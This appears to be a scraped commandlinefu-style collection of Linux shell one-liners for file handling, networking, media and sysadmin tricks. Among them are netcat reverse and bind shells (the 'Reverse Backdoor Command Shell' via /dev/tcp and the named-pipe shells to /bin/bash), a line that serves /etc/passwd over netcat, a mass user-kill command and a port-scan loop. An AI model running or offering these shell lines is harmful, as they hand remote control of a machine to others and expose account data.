$ parallel -j+0 "zcat {} |  bzip2 >{.}.bz2 &&  rm {}" ::: *.gz
copy
phpinfo from the command line
$ php -i
copy
Escape potential tarbombs
$ atb() { l=$( tar tf $1);  if [ $(echo "$l" |  wc -l) -eq $(echo "$l" |  grep $(echo "$l" |  head -n1) |  wc -l) ]; then  tar xf $1; else  mkdir ${1%. tar.gz} &&  tar xf $1 -C ${1%. tar.gz}; fi ;}
copy
pretend to be busy in office to enjoy a cup of coffee
$ while [  true ]; do  head -n 100 /dev/urandom;  sleep .1; done |  hexdump -C |  grep "ca fe"
copy
runs a X session within your X session
$ ssh -C -Y -l$USER xserver.mynet.xx 'Xnest -geometry 1900x1150 -query localhost'
copy
Find all symlinks that link to directories
$ find -type l -xtype d
copy
Have a random "cow" say a random thing
$ fortune |  cowsay -f $(ls /usr/share/ cowsay/cows/ |  shuf -n1)
copy
sends a postscript file to a postscript printer using netcat
$ cat my.ps |  nc -q 1 hp4550.mynet.xx 9100
copy
Display which distro is installed
$ cat /etc/*release
copy
Fetch every font from dafont.com to current folder
$ d="www.dafont.com/alpha.php?"; for c in {a..z}; do l=`curl -s "${d}lettre=${c}"|sed -n 's/.*ge=\([0-9]\{2\}\).*/\1/p'`; for((p=1;p<=l;p++));do  for u in `curl -s "${d}page=${p}&lettre=${c}"|egrep -o "http\S*.com/dl/\?f=\w*"`;do  aria2c "${u}";done;done;done
copy
Realtime lines per second in a log file
$ tail -f access.log |  pv -l -i10 -r >/dev/null
copy
intercept stdout/stderr of another process
$ strace -ff -e write=1,2 -s 1024 -p PID  2>&1 |  grep "^ |" |  cut -c11-60 |  sed -e 's/ //g' |  xxd -r -p
copy
send DD a signal to print its progress
$ while :;do  killall -USR1 dd;sleep 1;done
copy
See your current RAM frequency
$ dmidecode -t 17 |  awk -F":" '/Speed/ {  print $2 }'
copy
scp with compression.
$ scp -C 10.0.0.4:/tmp/backup.sql /path/to/backup.sql
copy
Perl Command Line Interpreter
$ perl -e 'while(1){print"> ";eval<>}'
copy
Find unused IPs on a given subnet
$ nmap -T4 -sP 192.168.2.0/24 &&  egrep "00:00:00:00:00:00" /proc/net/arp
copy
Change the From: address on the fly for email sent from the command-line
$ mail -s "subject" user@todomain.com <e mailbody.txt  -- -f customfrom@fromdomain.com -F 'From Display Name'
copy
find and delete empty dirs, start in current working dir
$ find . -type d -empty -delete
copy
Check which files are opened by Firefox then sort by largest size.
$ l sof -p $(pidof firefox) |  awk '/.mozilla/ {  s = int($7/(2^20)); if( s>0)  print ( s)" MB -- "$9 | " sort -rn" }'
copy
Use colordiff in side-by-side mode, and with automatic column widths.
$ colordiff -yW"`tput cols`" /path/to/file1 /path/to/file2
copy
extract email adresses from some file (or any other pattern)
$ grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})'
copy
geoip information
$ curl -s "http://www.geody.com/geoip.php?ip=$( curl -s icanhazip.com)" |  sed '/^IP:/!d;s/<[^>][^>]*>//g'
copy
What is my ip?
$ curl http://www.whatismyip.org/
copy
convert vdi to vmdk (virtualbox hard disk conversion to vmware hard disk format)
$ VBoxManage internalcommands  converttoraw winxp.vdi winxp.raw &&  qemu-img  convert -O vmdk winxp.raw winxp.vmdk &&  rm winxp.raw
copy
FAST Search and Replace for Strings in all Files in Directory
$ sh -c 'S=askapache R=htaccess;  find . -mount -type f|xargs -P5 -iFF  grep -l -m1 "$S" FF|xargs -P5 -iFF  sed -i -e "s%${S}%${R}%g" FF'
copy
Get the total length of time in hours:minutes:seconds (HH:MM:SS) of all video (or audio) in the current dir (and below)
$ find -type f -name "*.avi" -print0 |  xargs -0   mplayer -vo dummy -ao dummy -identify 2>/dev/null |  perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) &&  printf "%02d:%02d:%02d
",$t/3600,$t/60%60,$t%60' |  tail -n 1
copy
Send data securly over the net.
$ cat /etc/passwd |  openssl aes-256-cbc -a -e -pass pass:password | net cat -l -p 8080
copy
When was your OS installed?
$ ls -lct /etc |  tail -1 |  awk '{print $6, $7}'
copy
How to run a command on a list of remote servers read from a file
$ while  read server; do  ssh -n user@$server "command"; done < servers.txt
copy
Replace spaces in filenames with underscorees
$ ls |  while  read f; do  mv "$f" "${f// /_}";done
copy
find the biggest files recursively, no matter how many
$ find . -type f -printf '%20s %p
' |  sort -n |  cut -b22- |  tr '
' '\000' |  xargs -0  ls -laSr
copy
grep certain file types recursively
$ grep -r --include="*.[ch]" pattern .
copy
Change proccess affinity.
$ taskset -cp <core> <pid>
copy
back up your commandlinefu contributed commands
$ curl http://www.commandlinefu.com/commands/by/<your username>/rss|gzip ->commandlinefu-contribs-backup-$(date +%Y-%m-%d-%H.%M.%S).rss.gz
copy
benchmark web server with apache benchmarking tool
$ ab -n 9000 -c 900 localhost:8080/index.php
copy
Multiple SSH Tunnels
$ ssh -L :: -L :: @
copy
Redirect incoming traffic to SSH, from a port of your choosing
$ iptables -t nat -A PREROUTING -p tcp --dport [port of your choosing] -j REDIRECT --to-ports 22
copy
LDAP search to query an ActiveDirectory server
$ ldapsearch -LLL -H ldap://activedirectory.example.com:389 -b 'dc=example,dc=com' -D 'DOMAIN\Joe.Bloggs' -w 'p@ssw0rd' '(sAMAccountName=joe.bloggs)'
copy
Easily scp a file back to the host you're connecting from
$ mecp () {  scp "$@" ${SSH_CLIENT%% *}:Desktop/; }
copy
Super Speedy Hexadecimal or Octal Calculations and Conversions to Decimal.
$ echo "$(( 0x10 )) - $(( 010 )) = $(( 0x10 - 010 ))"
copy
find and replace tabs for spaces within files recursively
$ find ./ -type f -exec  sed -i 's/\t/  /g' {} \;
copy
alt + 1 .
$ alt + 1 .
copy
sends your internal IP by email
$ ifconfig en1 |  awk '/inet / {print $2}' |  mail -s "hello world" e mail@e mail.com
copy
synchronicity
$ cal 09 1752
copy
Terminal redirection
$ script /dev/null |  tee /dev/pts/3
copy
Use mtr to create a text file report
$ mtr --report --report-cycles 10 www.google.com > google_net_report.txt
copy
Rot13 using the tr command
$ alias rot13="tr '[A-Za-z]' '[N-ZA-Mn-za-m]'"
copy
Measures download speed on eth0
$ while true; do X=$Y;  sleep 1; Y=$(ifconfig eth0|grep RX\ bytes|awk '{  print $2 }'|cut -d : -f 2);  echo "$(( Y-X )) bps"; done
copy
Clean swap area after using a memory hogging application
$ swapoff -a ;  swapon -a
copy
loop over a set of items that contain spaces
$ ls |  while  read ITEM; do  echo "$ITEM"; done
copy
[re]verify a disc with very friendly output
$ dd if=/dev/cdrom |  pv -s 700m |  md5sum |  tee test.md5
copy
Traceroute w/TCP to get through firewalls.
$ tcptraceroute www.google.com
copy
Rotate a set of photos matching their EXIF data.
$ jhead -autorot *.jpg
copy
Launch a command from a manpage
$ !date
copy
hard disk information - Model/serial no.
$ hdparm -i[I] /dev/sda
copy
Split File in parts
$ split -b 19m  file Nameforpart
copy
Speak the top 6 lines of your twitter timeline every 5 minutes.....
$ while [ 1 ]; do  curl -s -u username:password  http://twitter.com/statuses/friends_timeline.rss|grep title|sed -ne 's/<\/*title>//gp' |  head -n 6 |festival --tts;  sleep 300;done
copy
To get you started!
$ vimtutor
copy
Exclude grep from your grepped output of ps (alias included in description)
$ ps aux |  grep [h]ttpd
copy
renames multiple files that match the pattern
$ rename 's/foo/bar/g' *
copy
infile search and replace on N files (including backup of the files)
$ perl -pi.bk -e's/foo/bar/g' file1 file2 fileN
copy
Command to logout all the users in one command
$ sudo  who |  awk '!/root/{ cmd="/sbin/pkill -KILL -u " $1; system(cmd)}'
copy
Rename all subtitles files with the same name of mp4 files in same folder
$ paste -d: <(ls -1 *.mp4) <(ls -1 *.srt) |  while  read line; do movie="${line%%:*}"; subtitle="${line##*:}";  mv "${subtitle}" "${movie%.*}.srt"; done
copy
SSH connection through host in the middle
$ ssh -J user@reachable_host user@unreacheable_host
copy
!* Tells that you want all of the *arguments* from the previous command to be repeated in the current command
$ chmod 777 !*
copy
Show running services (using systemctl)
$ command  systemctl --no-page --no-legend --plain -t  service --state=running
copy
Convert all JPEG images to MP4
$ cat *.jpg |  ffmpeg -f image2pipe -r 1 -vcodec mjpeg -i - -vcodec libx264 out.mp4
copy
Binary clock
$ perl -e 'for(;;sleep 1){printf"\r"."%.4b "x6,split"",`date +%H%M%S`}'
copy
Bare Metal IRC Client
$ nik=clf$RANDOM;sr=irc.efnet.org;expect -c "set  timeout -1;spawn  nc $sr 6666;set send_human {.1 .2 1 .2 1};expect AUTH*
 ;send -h \"user $nik * * :$nik commandlinefu
nick $nik
\"; interact -o -re (PING.:)(.*\$) {send \"PONG :\$interact_out(2,string)\"}"
copy
pulsed terminal clock
$ clear;while true;sleep 1;do for((a=1;a<=$( tput cols)/3;a++));do  tput cup 0 $a;echo " " $(date);done;sleep 1;for((a;a>=1;a--));do  tput cup 0 $a;echo $(date) " ";done;done
copy
Submit command & rewrite orginal command
$ <ctrl>+o
copy
Encrypted chat with netcat and openssl (one-liner)
$ server$ while true; do  read -n30 ui;  echo $ui | openssl e nc -aes-256-ctr -a -k PaSSw; done |  nc -l -p 8877 |  while  read so; do decoded_so=` echo "$so"|  openssl e nc -d -a -aes-256-ctr -k PaSSw`;  echo -e "I ncoming: $decoded_so"; done
copy
removes characters from cursor to the end of line
$ Ctrl+k
copy
Symlink all files from a base directory to a target directory
$ ln -s /BASE/* /TARGET/
copy
All what exists in dir B and not in dir A will be copied from dir B to new or existing dir C
$ rsync -v -r --size-only --compare-dest=../A/ B/ C/
copy
find previously entered commands (requires configuring .inputrc)
$ <Meta-p> (aka <ALT+P>)
copy
Add directory to $PATH if it's not already there
$ if [[ ":$PATH:" != *":$dir:"* ]]; then PATH=${PATH}:$dir; fi
copy
Debug how files are being accessed by a process
$ inotifywait -m -r .
copy
Convert JSON to YAML
$ python -c 'import sys, yaml, json; yaml.safe_dump(json.load(sys.stdin), sys.stdout, default_flow_style=False)' < file.json > file.yaml
copy
Search google.com on your terminal
$ Q="YOURSEARCH"; GOOG_URL="http://www.google.com/search?q="; AGENT="Mozilla/4.0"; stream=$(curl -A "$AGENT" -skLm 10 "${GOOG_URL}\"${Q/\ /+}\"" |  grep -oP '\/url\?q=.+?&amp' |  sed 's/\/url?q=//;s/&amp//');  echo -e "${stream//\%/\x}"
copy
Reverse Backdoor Command Shell using Netcat
$ exec 5<>/dev/tcp/<your-box>/8080;cat <&5 |  while  read line; do $line 2>&5 >&5; done
copy
Emulating netcat -e (netcat-traditional or netcat-openbsd) with the gnu-netcat
$ mkfifo foo ;  nc -lk 2600 0<foo | /bin/bash 1>foo
copy
Find biggest 10 files in current and subdirectories and sort by file size
$ find . -type f -print0 |  xargs -0  du -h |  sort -hr |  head -10
copy
Get your external IP and Network Info
$ curl ifconfig.me/all
copy
Quickly CD Out Of Directories Without 5+ Aliases
$ up() {  local x='';for i in $(seq ${1:-1});do x="$x../"; done;cd $x; }
copy
List all commands present on system
$ ls ${PATH//:/ }
copy
A line across the entire width of the terminal
$ printf "%$(tput cols)s
"|tr ' ' '='
copy
Create the four oauth keys required for a Twitter stream feed
$ step1() { k1="Consumer key" ; k2="Consumer secret" ; k3="Access token" ; k4="Access token secret" ; once=$RANDOM ; ts=$(date +%s) ; hmac="$k2&$k4" ; id="19258798" ; }
copy
Check if a machine is online
$ ping -c 1 -q MACHINE_IP_OR_NAME >/dev/null 2>&1 &&  echo ONLINE ||  echo OFFLINE
copy
diff the outputs of two programs
$ diff <(exiftool img_1.jpg) <(exiftool img_2.jpg)
copy
put an unpacked .deb package back together
$ dpkg-repack  firefox
copy
extract element of xml
$ xmlstarlet sel -t -c "/path/to/element" file.xml
copy
Print all lines between two line numbers
$ awk 'NR >= 3 && NR <= 6' /path/to/file
copy
Show network throughput
$ tcpdump -w - |pv -bert >/dev/null
copy
Generate a random password 30 characters long
$ cat /dev/urandom |  tr -dc A-Za-z0-9 |  head -c 32
copy
Remove the first and the latest caracter of a string
$ var=:foobar:;  echo ${var:1:-1}
copy
Load file into RAM (cache) for faster accessing for repeated usage
$ cat <file> > /dev/null
copy
Show IP Address in prompt --> PS1 var
$ export PS1="[\u@`hostname -I` \W]$ "
copy
log a command to console and to 2 files separately stdout and stderr
$ command > >(tee stdout.log) 2> >(tee stderr.log >&2)
copy
Join lines split with backslash at the end
$ sed -e '/\\$/{:0;N;s/\\
//;t0}'
copy
Convert text to lowercase
$ lower() {  echo ${@,,}; }
copy
find builtin in bash v4+
$ ls -l /etc/**/*killall
copy
make image semi-transparent
$ convert input.png -alpha  set -channel A -fx 0.5 output.png
copy
execute a shell with netcat without -e
$ mknod backpipe p &&  nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe
copy
output length of longest line
$ awk '(length > n) {n = length} END {print n}'
copy
Save your terminal commands in bash history in real time
$ shopt -s histappend ; PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
copy
Connect via SSH to VirtualBox guest VM without knowing IP address
$ ssh vm-user@`VBoxManage guestproperty get "vm-name" "/VirtualBox/GuestInfo/Net/0/V4/IP" |  awk '{  print $2 }'`
copy
Make redirects to localhost via /etc/hosts more interesting
$ sudo  socat TCP4-LISTEN:80,bind=127.0.0.1,fork EXEC:'echo "HTTP/1.1 503 Service Unavailable";'
copy
Tricky implementation of two-dimensional array in Bash.
$ arr[i*100+j]="whatever"
copy
Terrorist threat level text
$ echo "Terrorist threat level: `od -An -N1 -i /dev/random`"
copy
Use wget to download one page and all it's requisites for offline viewing
$ wget -e robots=off -E -H -k -K -p http://<page>
copy
Convert a string to "Title Case"
$ echo "this is a test" |  sed 's/.*/\L&/; s/[a-z]*/\u&/g'
copy
RTFM function
$ rtfm() { help $@ ||  info $@ ||  man $@ || $BROWSER "http://www.google.com/search?q=$@"; }
copy
back ssh from firewalled hosts
$ ssh -R 5497:127.0.0.1:22 -p 62220 user@public.ip
copy
rename files according to file with colums of corresponding names
$ xargs -n 2  mv < file_with_colums_of_names
copy
Create a new file
$ >  file
copy
Monitor a file with tail with timestamps added
$ tail -f  file |  awk '{now=strftime("%F %T%z\t");sub(/^/, now);print}'
copy
Use result of the last command
$ `!!`
copy
Check disk for bad sectors
$ badblocks -n -s -b  2048 /dev/sdX
copy
run a command whenever a file is touched
$ ontouchdo(){  while :; do a=$(stat -c%Y "$1"); [ "$b" != "$a" ] && b="$a" &&  sh -c "$2";  sleep 1; done }
copy
Create a file of a given size in linux
$ truncate -s 1M  file
copy
Extended man command
$ /usr/bin/man $* ||  w3m -dump http://google.com/search?q="$*"\&btnI |  less
copy
Get notified when a job you run in a terminal is done, using NotifyOSD
$ alias alert='notify-send -i /usr/share/icons/gnome/32x32/apps/gnome-terminal.png "[$?] $(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/;\s*alert$//'\'')"'
copy
Show which process is blocking umount (Device or resource is busy)
$ lsof /folder
copy
Show the UUID of a filesystem or partition
$ blkid /dev/sda7
copy
run command on a group of nodes
$ mussh -h host1 host2 host3 -c  uptime
copy
Setting global redirection of STDERR to STDOUT in a script
$ exec 2>&1
copy
Outgoing IP of server
$ dig +short @resolver1.opendns.com myip.opendns.com
copy
Isolate file name from full path/find output
$ echo ${fullpath##*/}
copy
Show numerical values for each of the 256 colors in bash
$ for i in {0..255}; do  echo -e "\e[38;05;${i}m${i}"; done |  column -c 80 -s '  ';  echo -e "\e[m"
copy
Use Kernighan & Ritchie coding style in C program
$ indent -kr hello.c
copy
Delay execution until load average falls under 1.5
$ echo 'some command' |  batch
copy
backup with mysqldump a really big mysql database to a remote machine over ssh
$ mysqldump -q --skip-opt --force --log-error=dbname_error.log -uroot -pmysqlpassword dbname |  ssh -C user@ sshserver 'cd /path/to/backup/dir;  cat > dbname.sql'
copy
Tail -f at your own pace
$ tail -fs 1 somefile
copy
Watch the progress of 'dd'
$ dd if=/dev/zero |  pv |  dd of=/dev/null
copy
Smart `cd`.. cd to the file directory if you try to cd to a file
$ cd() {  if [ -z "$1" ]; then  command  cd; else  if [ -f "$1" ]; then  command  cd $(dirname "$1"); else  command  cd "$1"; fi; fi; }
copy
Temporarily ignore known SSH hosts
$ ssh -o UserKnownHostsFile=/dev/null root@192.168.1.1
copy
dd with progress bar
$ dd if=/dev/nst0 |pv| dd of=restored_file.tar
copy
Save the Top 2500 commands from commandlinefu to a single text file
$ curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2500:25] |  grep -v _ curl_ > comfu.txt
copy
Simple addicting bash game.
$ count="1" ;  while  true ; do  read  next ;  if [[ "$ next" = "$last" ]] ; then count=$(($count+1)) ;  echo "$count" ; else count="1" ;  echo $count ; fi ; last="$ next" ; done
copy
Query Wikipedia via console over DNS
$ mwiki() {  dig +short txt "$*".wp.dg.cx; }
copy
Print a row of 50 hyphens
$ python -c 'print "-"*50'
copy
Display a wave pattern
$ ruby -e "i=0;loop{puts ' '*(29*(Math.sin(i)/2+1))+'|'*(29*(Math.cos(i)/2+1)); i+=0.1}"
copy
grep tab chars
$ grep "^V<TAB>" your_file
copy
send a message to a windows machine in a popup
$ echo "message" |  smbclient -M NAME_OF_THE_COMPUTER
copy
Using mplayer to play the audio only but suppress the video
$ mplayer -novideo something.mpg
copy
Using mplayer to play the audio only but suppress the video
$ mplayer -vo null something.mpg
copy
create a temporary file in a command line call
$ any_script.sh < <(some command)
copy
shell function to make gnu info act like man.
$ my info() {  info --subnodes -o - $1 | less; }
copy
Get your commandlinefu points (upvotes - downvotes)
$ username=matthewbauer;  curl -s http://www.commandlinefu.com/commands/by/$username/json |  tr '{' '
' |  grep -Eo ',"votes":"[0-9\-]+","' |  grep -Eo '[0-9\-]+' |  tr '
' '+' |  sed 's/+$/
/' |  bc
copy
Replace spaces in filenames with underscores
$ for f in *;do  mv "$f" "${f// /_}";done
copy
Insert the last argument of the previous command
$ !$
copy
Remote control for Rhythmbox on an Ubuntu Media PC
$ alias rc='ssh ${MEDIAPCHOSTNAME}  env DISPLAY=:0.0 rhythmbox-client --no-start'
copy
Remove everything except that file
$ find . ! -name <FILENAME> -delete
copy
Remove today's Debian installed packages
$ grep -e `date +%Y-%m-%d` /var/log/dpkg.log |  awk '/install / {print $4}' |  uniq |  xargs  apt-get -y remove
copy
Amazing real time picture of the sun in your wallpaper
$ curl http://sohowww.nascom.nasa.gov/data/realtime/eit_195/512/latest.jpg | xli -onroot -fill stdin
copy
bash screensaver off
$ setterm -powersave off -blank 0
copy
Monitor a file's size
$ watch -n60  du /var/log/messages
copy
Smart renaming
$ mmv 'banana_*_*.asc' 'banana_#2_#1.asc'
copy
is today the end of the month?
$ [ `date --date='next day' +'%B'` == `date +'%B'` ] ||  echo 'end of month'
copy
Port scan a range of hosts with Netcat.
$ for i in {21..29}; do  nc -v -n -z -w 1 192.168.0.$i 443; done
copy
Log your internet download speed
$ echo $(date +%s) > start-time; URL=http://www.google.com;  while true; do  echo $(curl -L --w %{speed_download} -o/dev/null -s $URL) >> bps;  sleep 10; done &
copy
Show Directories in the PATH Which does NOT Exist
$ (IFS=:;for p in $PATH; do  test -d $p ||  echo $p; done)